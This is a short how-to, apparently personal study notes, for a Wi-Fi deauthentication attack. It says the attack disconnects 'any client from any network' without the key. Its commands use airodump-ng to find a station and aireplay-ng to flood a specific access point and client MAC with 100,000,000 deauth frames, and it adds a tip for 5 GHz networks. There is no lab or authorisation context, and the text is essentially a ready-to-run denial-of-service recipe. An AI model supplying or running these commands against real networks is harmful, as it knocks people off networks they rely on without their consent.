Deauthentication attack

Disconnect any client from any network
1. Works on encrypted networks (WEP, WPA & WPA2
2. No need to know the network key
3. No need to connect to the network

To deauthenticate a computer or station from bssid we make a deauthentication attack
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 mon0
It will give me station
Before hitting this command to deauthenticate

aireplay-ng --deauth 100000000 -a F8:23:B2:B9:50:A8(bssid) -c 80:E6:50:22:A2:E8(station) mon0
If your network is more than 5ghz then after station we have to use -D and then space and then mon0(which is my wireless adapter name)
